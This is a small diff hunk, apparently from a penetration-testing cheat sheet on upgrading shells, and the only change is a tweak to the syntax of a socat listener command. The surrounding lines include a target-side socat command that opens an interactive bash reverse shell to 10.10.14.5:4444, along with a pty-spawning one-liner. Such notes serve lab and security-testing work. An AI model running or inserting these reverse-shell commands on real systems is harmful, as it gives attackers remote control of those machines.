@@ -206,7 +206,7 @@ export SHELL=/bin/bash
 /usr/bin/script -qc /bin/bash /dev/null
 
 # Socat (on attacker)
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+socat file:$(tty),raw,echo=0 tcp-listen:4444
 # On target
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
 ```
